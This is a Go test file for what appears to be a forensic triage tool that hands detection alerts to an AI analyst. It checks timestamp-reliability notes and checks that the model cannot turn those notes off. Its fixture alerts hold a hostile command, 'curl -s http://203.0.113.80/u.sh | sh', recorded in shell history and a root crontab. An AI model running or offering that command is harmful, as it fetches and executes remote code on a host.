package analyst

import (
	"strings"
	"testing"
	"time"

	"github.com/kenzietann/omamori/internal/detect"
	"github.com/kenzietann/omamori/internal/event"
	"github.com/kenzietann/omamori/internal/rules"
)

func artifactOutcome() detect.Outcome {
	one := func(name string, seconds int, ref string, fields map[string]string) *rules.Alert {
		moment := start.Add(time.Duration(seconds) * time.Second)
		fields[event.User] = "root"
		return &rules.Alert{Rule: &rules.Rule{Name: name, Title: name + " observed", Level: "high"}, Time: moment, First: moment, Last: moment, Count: 1,
			Events: []event.Event{{Time: moment, Ref: ref, Fields: fields}}}
	}
	return detect.Outcome{Made: start, Location: time.UTC, Result: rules.Result{Alerts: []*rules.Alert{
		one("login", 0, "var/log/auth.log:60", map[string]string{event.Action: "login", event.Outcome: "success", event.SourceIP: "203.0.113.9"}),
		one("history", 60, "root/.bash_history:16", map[string]string{event.Service: "shell_history", event.Collector: "forensics", event.Command: "curl -s http://203.0.113.80/u.sh | sh", TimeSourceField: "recorded"}),
		one("cron", 120, "var/spool/cron/crontabs/root:2", map[string]string{event.Service: "cron_file", event.Collector: "forensics", event.Command: "curl -s http://203.0.113.80/u.sh | sh", "schedule": "*/30 * * * *", TimeSourceField: WeakTimeSource}),
	}}}
}

// A run over logs alone must give the same request as before the forensic triage existed. Recordings of
// earlier live runs are bound to the bytes of the request, and they must keep working.
func TestLogOnlyRequestIsUnchangedAndArtifactsAddTheNote(t *testing.T) {
	plain, err := Request(snapshotFor(t, fixture()))
	if err != nil {
		t.Fatal(err)
	}
	if plain.System != instruction || strings.Contains(plain.Messages[0].Text, TimeSourceField) {
		t.Fatal("the request of a log-only run changed")
	}

	snapshot := snapshotFor(t, artifactOutcome())
	request, err := Request(snapshot)
	if err != nil {
		t.Fatal(err)
	}
	if request.System != instruction+forensicNote || !strings.Contains(request.System, "do not derive an order of actions from it") {
		t.Fatal("the request with artifacts does not explain the times")
	}
	for _, want := range []string{`"time_source":"file_modified"`, `"time_source":"recorded"`, `"schedule":"*/30 * * * *"`, `"collector":"forensics"`} {
		if !strings.Contains(request.Messages[0].Text, want) {
			t.Errorf("the snapshot does not have %s", want)
		}
	}
}

func TestFindingsSayWhenTheirTimesAreWeak(t *testing.T) {
	snapshot := snapshotFor(t, artifactOutcome())
	byRule := map[string]Alert{}
	for _, alert := range snapshot.Alerts {
		byRule[alert.Rule] = alert
	}
	related := Claim{Kind: "related", Alerts: []string{byRule["login"].ID, byRule["history"].ID, byRule["cron"].ID}, Entity: byRule["cron"].Entities[0],
		Evidence: []string{byRule["login"].Evidence[0].ID, byRule["history"].Evidence[0].ID, byRule["cron"].Evidence[0].ID}}
	strong := related
	strong.Alerts, strong.Evidence = related.Alerts[:2], related.Evidence[:2]
	result := Check(snapshot, responseFor(t, claimFor(byRule["login"]), claimFor(byRule["history"]), claimFor(byRule["cron"]), related, strong))
	if result.Status != StatusComplete || len(result.Verified) != 5 {
		t.Fatalf("status %s, %d verified, rejected %+v", result.Status, len(result.Verified), result.Rejected)
	}
	const note = "do not say when or in which order things happened"
	for index, weak := range []bool{false, false, true, true, false} {
		finding := result.Verified[index]
		if finding.WeakTimes != weak || strings.Contains(finding.Summary, note) != weak {
			t.Errorf("finding %d: weak is %v, summary %q", index+1, finding.WeakTimes, finding.Summary)
		}
	}
	if !strings.Contains(Markdown(result), note) {
		t.Error("the report does not carry the note")
	}

	// The model cannot switch the note off: the field is not part of what it may send.
	denied := strings.Replace(responseFor(t, claimFor(byRule["cron"])), `"kind":"alert"`, `"kind":"alert","weak_times":false`, 1)
	if got := Check(snapshot, denied); len(got.Verified) != 0 {
		t.Fatal("a claim with a weak_times field was accepted")
	}
}
